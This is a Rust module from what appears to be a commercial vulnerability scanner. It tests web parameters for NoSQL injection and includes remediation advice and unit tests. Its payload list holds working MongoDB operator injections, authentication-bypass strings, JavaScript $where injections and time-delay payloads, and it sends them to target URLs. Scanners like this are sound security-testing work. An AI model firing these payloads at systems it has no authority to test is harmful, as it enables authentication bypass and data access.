// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - NoSQL Injection Scanner
 * Tests for MongoDB and other NoSQL database injection vulnerabilities
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */

use crate::http_client::{HttpClient, HttpResponse};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use std::sync::Arc;
use tracing::{debug, info};

pub struct NoSqlScanner {
    http_client: Arc<HttpClient>,
}

impl NoSqlScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan a parameter for NoSQL injection vulnerabilities
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("[NoSQL] Scanning parameter: {}", parameter);

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let payloads = self.generate_nosql_payloads();

        // Test each payload
        for payload in &payloads {
            tests_run += 1;

            let test_url = if base_url.contains('?') {
                format!("{}&{}={}", base_url, parameter, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", base_url, parameter, urlencoding::encode(payload))
            };

            debug!("Testing NoSQL payload: {} -> {}", parameter, payload);

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if let Some(vuln) = self.analyze_nosql_response(&response, payload, parameter, &test_url) {
                        info!("[ALERT] NoSQL injection detected in parameter '{}'", parameter);
                        vulnerabilities.push(vuln);
                        break; // Found vulnerability, stop testing this parameter
                    }
                }
                Err(e) => {
                    debug!("NoSQL test error: {}", e);
                }
            }
        }

        info!(
            "[SUCCESS] [NoSQL] Completed {} tests on parameter '{}', found {} vulnerabilities",
            tests_run,
            parameter,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Generate NoSQL injection payloads
    fn generate_nosql_payloads(&self) -> Vec<String> {
        vec![
            // MongoDB operator injection
            r#"{"$gt": ""}"#.to_string(),
            r#"{"$ne": null}"#.to_string(),
            r#"{"$ne": ""}"#.to_string(),
            r#"{"$nin": []}"#.to_string(),
            r#"{"$exists": true}"#.to_string(),
            r#"{"$regex": ".*"}"#.to_string(),
            r#"{"$where": "1==1"}"#.to_string(),

            // Authentication bypass attempts
            r#"' || '1'=='1"#.to_string(),
            r#"admin' || 'a'=='a"#.to_string(),
            r#"' || 1==1//"#.to_string(),
            r#"' || 1==1%00"#.to_string(),

            // Array injection
            "[\"admin\"]".to_string(),
            "{\"username\":\"admin\"}".to_string(),

            // URL-encoded operator injection
            "%7B%22%24gt%22%3A%22%22%7D".to_string(), // {"$gt":""}
            "%7B%22%24ne%22%3Anull%7D".to_string(),    // {"$ne":null}

            // JavaScript injection via $where
            r#"'; return true; var a='"#.to_string(),
            r#"'; return 1==1; var b='"#.to_string(),
            r#"\'; return true; var c=\'"#.to_string(),

            // Alternative syntax
            "[$gt]".to_string(),
            "[$ne]".to_string(),
            "[$regex]=.*".to_string(),

            // Tautology-based
            "true, $where: '1 == 1'".to_string(),
            "1, $where: '1 == 1'".to_string(),
            ", $where: '1 == 1'".to_string(),

            // Null byte injection
            "admin\0".to_string(),
            "admin%00".to_string(),

            // Time-based blind detection (causes delay)
            r#"'; sleep(5000); var d='"#.to_string(),
            r#"'; var start = new Date(); while ((new Date() - start) < 5000){}; var e='"#.to_string(),
        ]
    }

    /// Analyze HTTP response for NoSQL injection indicators
    fn analyze_nosql_response(
        &self,
        response: &HttpResponse,
        payload: &str,
        parameter: &str,
        test_url: &str,
    ) -> Option<Vulnerability> {
        let body_lower = response.body.to_lowercase();

        // Check for successful authentication bypass
        let auth_indicators = [
            "welcome",
            "dashboard",
            "logged in",
            "login successful",
            "authentication successful",
            "admin panel",
            "user profile",
            "account",
        ];

        // Check for database error messages (information leakage)
        let error_indicators = [
            "mongodb",
            "mongoose",
            "nosql",
            "query error",
            "syntax error",
            "parsing error",
            "cast error",
            "validation error",
            "bson",
            "objectid",
            "$where",
            "$gt",
            "$ne",
            "$nin",
        ];

        // Check for authentication bypass indicators
        let mut found_auth = false;
        for indicator in &auth_indicators {
            if body_lower.contains(indicator) {
                found_auth = true;
                break;
            }
        }

        if found_auth && (payload.contains("$gt") || payload.contains("$ne") || payload.contains("||")) {
            return Some(self.create_vulnerability(
                parameter,
                payload,
                test_url,
                "NoSQL injection allows authentication bypass",
                Confidence::High,
                format!("Response indicates successful authentication with NoSQL operator: {}", payload),
                Severity::Critical,
                9.8,
            ));
        }

        // Check for database error disclosure
        let mut found_error = false;
        let mut error_type = String::new();
        for indicator in &error_indicators {
            if body_lower.contains(indicator) {
                found_error = true;
                error_type = indicator.to_string();
                break;
            }
        }

        if found_error {
            return Some(self.create_vulnerability(
                parameter,
                payload,
                test_url,
                "NoSQL injection causes database error disclosure",
                Confidence::Medium,
                format!("Database error message detected containing: {}", error_type),
                Severity::High,
                7.5,
            ));
        }

        // DON'T report based solely on response size - this causes false positives
        // A normal web app will return a page for ANY parameter value
        // We need actual error messages or authentication bypass indicators

        None
    }

    /// Create vulnerability record
    fn create_vulnerability(
        &self,
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
        severity: Severity,
        cvss: f32,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("nosql_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: "NoSQL Injection".to_string(),
            severity,
            confidence,
            category: "Injection".to_string(),
            url: test_url.to_string(),
            parameter: Some(parameter.to_string()),
            payload: payload.to_string(),
            description: format!(
                "NoSQL injection vulnerability detected in parameter '{}'. {}. Attackers can bypass authentication, extract data, or manipulate database queries.",
                parameter, description
            ),
            evidence: Some(evidence),
            cwe: "CWE-943".to_string(), // Improper Neutralization of Special Elements in Data Query Logic
            cvss,
            verified: true,
            false_positive: false,
            remediation: r#"IMMEDIATE ACTION REQUIRED:
1. Use parameterized queries or ORM/ODM with proper escaping
2. Never pass user input directly to database queries
3. Validate and sanitize all user input
4. Use allowlists for expected input patterns
5. Implement proper authentication mechanisms
6. Disable JavaScript execution in MongoDB ($where operator)
7. Use least privilege database accounts
8. Implement rate limiting on authentication endpoints
9. Log and monitor for NoSQL injection attempts
10. Consider using MongoDB's role-based access control (RBAC)"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_nosql_payload_generation() {
        let scanner = NoSqlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
        let payloads = scanner.generate_nosql_payloads();

        // Should have comprehensive NoSQL payload set
        assert!(payloads.len() >= 25, "Should have at least 25 NoSQL payloads");

        // Check for MongoDB operators
        assert!(payloads.iter().any(|p| p.contains("$gt")), "Missing $gt operator");
        assert!(payloads.iter().any(|p| p.contains("$ne")), "Missing $ne operator");
        assert!(payloads.iter().any(|p| p.contains("$where")), "Missing $where operator");
        assert!(payloads.iter().any(|p| p.contains("$regex")), "Missing $regex operator");
    }

    #[test]
    fn test_authentication_bypass_detection() {
        let scanner = NoSqlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = HttpResponse {
            status_code: 200,
            body: "Welcome to the admin dashboard! You are logged in as admin.".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_nosql_response(
            &response,
            r#"{"$ne": null}"#,
            "username",
            "http://example.com?username={\"$ne\": null}"
        );

        assert!(result.is_some(), "Should detect NoSQL authentication bypass");
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::Critical);
    }

    #[test]
    fn test_error_disclosure_detection() {
        let scanner = NoSqlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = HttpResponse {
            status_code: 500,
            body: "MongoDB Error: Syntax error in query - $gt operator invalid".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_nosql_response(
            &response,
            r#"{"$gt": ""}"#,
            "id",
            "http://example.com?id={\"$gt\": \"\"}"
        );

        assert!(result.is_some(), "Should detect database error disclosure");
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::High);
    }

    #[test]
    fn test_no_false_positive() {
        let scanner = NoSqlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal page content without indicators</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_nosql_response(
            &response,
            r#"{"$ne": null}"#,
            "search",
            "http://example.com?search={\"$ne\": null}"
        );

        assert!(result.is_none(), "Should not report false positive on normal response");
    }
}
